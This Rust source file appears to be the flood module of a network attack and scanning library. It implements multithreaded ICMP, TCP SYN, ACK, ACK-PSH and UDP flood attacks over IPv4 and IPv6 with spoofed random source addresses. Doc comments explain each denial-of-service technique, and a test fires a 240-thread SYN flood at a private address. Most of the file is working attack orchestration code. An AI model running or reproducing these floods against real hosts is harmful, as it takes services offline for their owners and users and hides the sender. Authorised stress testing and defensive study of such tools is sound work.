#[cfg(feature = "flood")]
use chrono::DateTime;
#[cfg(feature = "flood")]
use chrono::Local;
#[cfg(feature = "flood")]
use prettytable::Cell;
#[cfg(feature = "flood")]
use prettytable::Row;
#[cfg(feature = "flood")]
use prettytable::Table;
#[cfg(feature = "flood")]
use prettytable::row;
#[cfg(feature = "flood")]
use std::collections::BTreeMap;
#[cfg(feature = "flood")]
use std::fmt;
#[cfg(feature = "flood")]
use std::net::IpAddr;
#[cfg(feature = "flood")]
use std::net::Ipv4Addr;
#[cfg(feature = "flood")]
use std::net::Ipv6Addr;
#[cfg(feature = "flood")]
use std::sync::mpsc::channel;
#[cfg(feature = "flood")]
use std::thread;
#[cfg(feature = "flood")]
use std::time::Duration;
#[cfg(feature = "flood")]
use std::time::Instant;
#[cfg(feature = "flood")]
use tracing::error;

#[cfg(feature = "flood")]
pub mod icmp;
#[cfg(feature = "flood")]
pub mod icmpv6;
#[cfg(feature = "flood")]
pub mod tcp;
#[cfg(feature = "flood")]
pub mod tcp6;
#[cfg(feature = "flood")]
pub mod udp;
#[cfg(feature = "flood")]
pub mod udp6;

#[cfg(feature = "flood")]
use crate::Target;
#[cfg(feature = "flood")]
use crate::error::PistolError;
#[cfg(feature = "flood")]
use crate::utils::random_ipv4_addr;
#[cfg(feature = "flood")]
use crate::utils::random_ipv6_addr;
#[cfg(feature = "flood")]
use crate::utils::random_port;
#[cfg(feature = "flood")]
use crate::utils::time_sec_to_string;

#[cfg(feature = "flood")]
#[derive(Debug, Clone)]
pub struct FloodReport {
    pub addr: IpAddr,
    pub origin: Option<String>,
    pub send_packet: usize, // count
    pub send_size: usize,   // KB, MB or GB
    pub time_cost: Duration,
}

#[cfg(feature = "flood")]
#[derive(Debug, Clone)]
pub struct PistolFloods {
    pub flood_reports: Vec<FloodReport>,
    pub start_time: DateTime<Local>,
    pub end_time: DateTime<Local>,
}

#[cfg(feature = "flood")]
impl PistolFloods {
    pub fn new() -> PistolFloods {
        PistolFloods {
            flood_reports: Vec::new(),
            start_time: Local::now(),
            end_time: Local::now(),
        }
    }
    pub fn finish(&mut self, flood_reports: Vec<FloodReport>) {
        self.end_time = Local::now();
        self.flood_reports = flood_reports;
    }
}

#[cfg(feature = "flood")]
impl fmt::Display for PistolFloods {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        const BYTES_PER_MB: u64 = 1024;
        const BYTES_PER_GB: u64 = 1024 * 1024;
        let mut table = Table::new();
        table.add_row(Row::new(vec![
            Cell::new("Flood Attack Summary")
                .style_spec("c")
                .with_hspan(3),
        ]));
        table.add_row(row![c -> "id", c -> "addr", c -> "report"]);

        // sorted
        let mut btm_addr: BTreeMap<IpAddr, FloodReport> = BTreeMap::new();
        for report in &self.flood_reports {
            btm_addr.insert(report.addr, report.clone());
        }

        let mut i = 1;
        for (addr, report) in btm_addr {
            let time_cost = report.time_cost;
            let time_cost_str = time_sec_to_string(time_cost);
            let time_cost = time_cost.as_secs_f64();
            let (size_str, traffic_str) = if report.send_size as f64 / BYTES_PER_GB as f64 > 1.0 {
                let v = report.send_size as f64 / BYTES_PER_GB as f64;
                let k = v / time_cost;
                (format!("{:.3}GB", v), format!("{:.3}GB/s", k))
            } else if report.send_size as f64 / BYTES_PER_MB as f64 > 1.0 {
                let v = report.send_size as f64 / BYTES_PER_MB as f64;
                let k = v / time_cost;
                (format!("{:.3}MB", v), format!("{:.3}MB/s", k))
            } else {
                let v = report.send_size;
                let k = v as f64 / time_cost;
                (format!("{}Bytes", v), format!("{:.3}B/s", k))
            };
            let traffic_str = format!(
                "packets sent: {}({}), time cost: {}({})",
                report.send_packet, size_str, time_cost_str, traffic_str
            );

            let addr_str = match report.origin {
                Some(o) => format!("{}({})", addr, o),
                None => format!("{}", report.addr),
            };
            table.add_row(row![c -> i, c -> addr_str, c -> traffic_str]);
            i += 1;
        }
        write!(f, "{}", table.to_string())
    }
}

#[cfg(feature = "flood")]
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum FloodMethods {
    Icmp,
    Syn,
    Ack,
    AckPsh,
    Udp,
}

#[cfg(feature = "flood")]
fn ipv4_flood_thread(
    method: FloodMethods,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    num_threads: usize,
    retransmit_count: usize,
    repeat_count: usize,
) -> Result<(usize, usize), PistolError> {
    let dst_port = if method == FloodMethods::Icmp {
        0
    } else {
        dst_port
    };

    let func = match method {
        FloodMethods::Icmp => icmp::send_icmp_flood_packet,
        FloodMethods::Syn => tcp::send_syn_flood_packet,
        FloodMethods::Ack => tcp::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp::send_udp_flood_packet,
    };
    let (tx, rx) = channel();
    let mut recv_size = 0;

    for _ in 0..num_threads {
        recv_size += repeat_count;
        let tx = tx.clone();
        thread::spawn(move || {
            for _ in 0..repeat_count {
                let src_ipv4 = random_ipv4_addr(); // fake src addr
                let src_port = random_port(); // fake src port
                // println!("src {}:{}", src_ipv4, src_port);

                let send_buff_size =
                    match func(dst_ipv4, dst_port, src_ipv4, src_port, retransmit_count) {
                        Ok(s) => s + 14, // Ethernet frame header length.
                        Err(e) => {
                            error!("{}", e);
                            0
                        }
                    };
                let _ = tx.send(send_buff_size);
            }
        });
    }
    let iter = rx.into_iter().take(recv_size);
    let mut total_send_buff_size = 0;
    for send_buff_size in iter {
        total_send_buff_size += send_buff_size;
    }
    Ok((num_threads * retransmit_count, total_send_buff_size))
}

#[cfg(feature = "flood")]
fn ipv6_flood_thread(
    method: FloodMethods,
    dst_ipv6: Ipv6Addr,
    dst_port: u16,
    num_threads: usize,
    retransmit_count: usize,
    repeat_count: usize,
) -> Result<(usize, usize), PistolError> {
    let dst_port = if method == FloodMethods::Icmp {
        0
    } else {
        dst_port
    };

    let func = match method {
        FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet,
        FloodMethods::Syn => tcp6::send_syn_flood_packet,
        FloodMethods::Ack => tcp6::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp6::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp6::send_udp_flood_packet,
    };
    let (tx, rx) = channel();
    let mut recv_size = 0;

    for _ in 0..num_threads {
        recv_size += repeat_count;
        let tx = tx.clone();
        thread::spawn(move || {
            for _ in 0..repeat_count {
                let src_ipv6 = random_ipv6_addr(); // fake src addr
                let src_port = random_port(); // fake src port

                let send_buff_size =
                    match func(dst_ipv6, dst_port, src_ipv6, src_port, retransmit_count) {
                        Ok(s) => s + 14, // Ethernet frame header length.
                        Err(e) => {
                            error!("{}", e);
                            0
                        }
                    };
                let _ = tx.send(send_buff_size);
            }
        });
    }
    let iter = rx.into_iter().take(recv_size);
    let mut total_send_buff_size = 0;
    for send_buff_size in iter {
        total_send_buff_size += send_buff_size;
    }
    Ok((num_threads * retransmit_count, total_send_buff_size))
}

#[cfg(feature = "flood")]
fn flood(
    targets: &[Target],
    num_threads: usize,
    method: FloodMethods,
    retransmit_count: usize,
    repeat_count: usize,
) -> Result<PistolFloods, PistolError> {
    let mut pistol_floods = PistolFloods::new();
    let (tx, rx) = channel();

    let mut recv_size = 0;
    for target in targets {
        let dst_addr = target.addr;
        match dst_addr {
            IpAddr::V4(dst_ipv4) => {
                for dst_port in &target.ports {
                    let origin = target.origin.clone();
                    let tx = tx.clone();
                    let dst_port = dst_port.clone();
                    recv_size += 1;
                    thread::spawn(move || {
                        let start_time = Instant::now();
                        let ret = ipv4_flood_thread(
                            method,
                            dst_ipv4,
                            dst_port,
                            retransmit_count,
                            repeat_count,
                            num_threads,
                        );
                        let _ = tx.send((dst_addr, origin, ret, start_time));
                    });
                }
            }
            IpAddr::V6(dst_ipv6) => {
                for dst_port in &target.ports {
                    let origin = target.origin.clone();
                    let tx = tx.clone();
                    let dst_port = dst_port.clone();
                    recv_size += 1;
                    thread::spawn(move || {
                        let start_time = Instant::now();
                        let ret = ipv6_flood_thread(
                            method,
                            dst_ipv6,
                            dst_port,
                            retransmit_count,
                            repeat_count,
                            num_threads,
                        );
                        let _ = tx.send((dst_addr, origin, ret, start_time));
                    });
                }
            }
        }
    }

    let iter = rx.into_iter().take(recv_size);
    let mut flood_reports = Vec::new();
    for (addr, origin, ret, start_time) in iter {
        let time_cost = start_time.elapsed();
        match ret {
            Ok((send_packet, send_size)) => {
                let flood_report = FloodReport {
                    addr,
                    origin,
                    send_packet,
                    send_size,
                    time_cost,
                };
                flood_reports.push(flood_report);
            }
            Err(e) => return Err(e),
        }
    }
    pistol_floods.finish(flood_reports);
    Ok(pistol_floods)
}

#[cfg(feature = "flood")]
pub fn flood_raw(
    method: FloodMethods,
    dst_addr: IpAddr,
    dst_port: u16,
    retransmit_count: usize,
) -> Result<usize, PistolError> {
    let func = match method {
        FloodMethods::Icmp => icmp::send_icmp_flood_packet,
        FloodMethods::Syn => tcp::send_syn_flood_packet,
        FloodMethods::Ack => tcp::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp::send_udp_flood_packet,
    };
    let func6 = match method {
        FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet,
        FloodMethods::Syn => tcp6::send_syn_flood_packet,
        FloodMethods::Ack => tcp6::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp6::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp6::send_udp_flood_packet,
    };

    match dst_addr {
        IpAddr::V4(dst_ipv4) => {
            let src_port = random_port();
            let src_ipv4 = random_ipv4_addr();

            let send_buff_size =
                match func(dst_ipv4, dst_port, src_ipv4, src_port, retransmit_count) {
                    Ok(s) => s + 14, // Ethernet frame header length.
                    Err(_) => 0,
                };
            Ok(send_buff_size)
        }
        IpAddr::V6(dst_ipv6) => {
            let src_port = random_port();
            let src_ipv6 = random_ipv6_addr();

            let send_buff_size =
                match func6(dst_ipv6, dst_port, src_ipv6, src_port, retransmit_count) {
                    Ok(s) => s + 14, // Ethernet frame header length.
                    Err(_) => 0,
                };
            Ok(send_buff_size)
        }
    }
}

/// An Internet Control Message Protocol (ICMP) flood DDoS attack, also known as a Ping flood attack,
/// is a common Denial-of-Service (DoS) attack in
/// which an attacker attempts to overwhelm a targeted device with ICMP echo-requests (pings).
/// Normally, ICMP echo-request and echo-reply messages are used to ping a network device
/// in order to diagnose the health and connectivity of the device and the connection
/// between the sender and the device.
/// By flooding the target with request packets,
/// the network is forced to respond with an equal number of reply packets.
/// This causes the target to become inaccessible to normal traffic.
/// Total number of packets sent = retransmit_count x num_threads.
#[cfg(feature = "flood")]
pub fn icmp_flood(
    targets: &[Target],
    num_threads: usize,
    retransmit_count: usize,
    repeat_count: usize,
) -> Result<PistolFloods, PistolError> {
    flood(
        targets,
        num_threads,
        FloodMethods::Icmp,
        retransmit_count,
        repeat_count,
    )
}

#[cfg(feature = "flood")]
pub fn icmp_flood_raw(dst_addr: IpAddr, retransmit_count: usize) -> Result<usize, PistolError> {
    let dst_port = 0;
    flood_raw(FloodMethods::Icmp, dst_addr, dst_port, retransmit_count)
}

/// In a TCP SYN Flood attack, the malicious entity sends a barrage of
/// SYN requests to a target server but intentionally avoids sending the final ACK.
/// This leaves the server waiting for a response that never comes,
/// consuming resources for each of these half-open connections.
#[cfg(feature = "flood")]
pub fn tcp_syn_flood(
    targets: &[Target],
    num_threads: usize,
    retransmit_count: usize,
    repeat_count: usize,
) -> Result<PistolFloods, PistolError> {
    flood(
        targets,
        num_threads,
        FloodMethods::Syn,
        retransmit_count,
        repeat_count,
    )
}

#[cfg(feature = "flood")]
pub fn tcp_syn_flood_raw(
    dst_addr: IpAddr,
    dst_port: u16,
    retransmit_count: usize,
) -> Result<usize, PistolError> {
    flood_raw(FloodMethods::Syn, dst_addr, dst_port, retransmit_count)
}

/// TCP ACK flood, or 'ACK Flood' for short, is a network DDoS attack comprising TCP ACK packets.
/// The packets will not contain a payload but may have the PSH flag enabled.
/// In the normal TCP, the ACK packets indicate to the other party that the data have been received successfully.
/// ACK packets are very common and can constitute 50% of the entire TCP packets.
/// The attack will typically affect stateful devices that must process each packet and that can be overwhelmed.
/// ACK flood is tricky to mitigate for several reasons. It can be spoofed;
/// the attacker can easily generate a high rate of attacking traffic,
/// and it is very difficult to distinguish between a Legitimate ACK and an attacking ACK, as they look the same.
#[cfg(feature = "flood")]
pub fn tcp_ack_flood(
    targets: &[Target],
    num_threads: usize,
    retransmit_count: usize,
    repeat_count: usize,
) -> Result<PistolFloods, PistolError> {
    flood(
        targets,
        num_threads,
        FloodMethods::Ack,
        retransmit_count,
        repeat_count,
    )
}

#[cfg(feature = "flood")]
pub fn tcp_ack_flood_raw(
    dst_addr: IpAddr,
    dst_port: u16,
    retransmit_count: usize,
) -> Result<usize, PistolError> {
    flood_raw(FloodMethods::Ack, dst_addr, dst_port, retransmit_count)
}

/// TCP ACK flood with PSH flag set.
#[cfg(feature = "flood")]
pub fn tcp_ack_psh_flood(
    targets: &[Target],
    num_threads: usize,
    retransmit_count: usize,
    repeat_count: usize,
) -> Result<PistolFloods, PistolError> {
    flood(
        targets,
        num_threads,
        FloodMethods::AckPsh,
        retransmit_count,
        repeat_count,
    )
}

#[cfg(feature = "flood")]
pub fn tcp_ack_psh_flood_raw(
    dst_addr: IpAddr,
    dst_port: u16,
    retransmit_count: usize,
) -> Result<usize, PistolError> {
    flood_raw(FloodMethods::AckPsh, dst_addr, dst_port, retransmit_count)
}

/// In a UDP Flood attack, the attacker sends a massive number of UDP packets to random ports on the target host.
/// This barrage of packets forces the host to:
/// Check for applications listening at each port.
/// Realize that no application is listening at many of these ports.
/// Respond with an Internet Control Message Protocol (ICMP) Destination Unreachable packet.
#[cfg(feature = "flood")]
pub fn udp_flood(
    targets: &[Target],
    num_threads: usize,
    retransmit_count: usize,
    repeat_count: usize,
) -> Result<PistolFloods, PistolError> {
    flood(
        targets,
        num_threads,
        FloodMethods::Udp,
        retransmit_count,
        repeat_count,
    )
}

#[cfg(feature = "flood")]
pub fn udp_flood_raw(
    dst_addr: IpAddr,
    dst_port: u16,
    retransmit_count: usize,
) -> Result<usize, PistolError> {
    flood_raw(FloodMethods::Udp, dst_addr, dst_port, retransmit_count)
}

#[cfg(feature = "flood")]
#[cfg(test)]
mod tests {
    use super::*;
    use crate::PistolLogger;
    use crate::PistolRunner;
    use crate::Target;
    #[test]
    fn test_flood() {
        let _pr = PistolRunner::init(PistolLogger::None, None, None).unwrap();

        let dst_addr = Ipv4Addr::new(192, 168, 5, 5);
        let ports = Some(vec![22]);
        let target1 = Target::new(dst_addr.into(), ports);
        let num_threads = 240; // It can be simply understood as the number of attack threads.
        let retransmit_count = 480; // The number of times to repeat sending the same attack packet.
        let repeat_count = 4; // The number of times each thread repeats the attack.
        let ret = tcp_syn_flood(&[target1], num_threads, retransmit_count, repeat_count).unwrap();
        println!("{}", ret);
    }
}
